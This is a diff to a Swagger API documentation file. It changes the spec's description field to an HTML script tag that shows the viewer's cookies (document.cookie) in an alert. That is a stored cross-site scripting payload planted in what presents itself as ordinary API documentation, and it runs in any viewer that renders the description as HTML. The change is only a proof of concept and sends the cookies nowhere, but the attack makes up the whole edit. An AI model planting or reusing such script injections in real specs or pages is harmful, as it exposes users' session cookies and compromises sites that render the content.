@@ -2,4 +2,4 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <script>alert('Vatins_Systems')</script>
+    <script>alert("Vatins_Systems"+"_here_is_your_cookies"+document.cookie)</script>
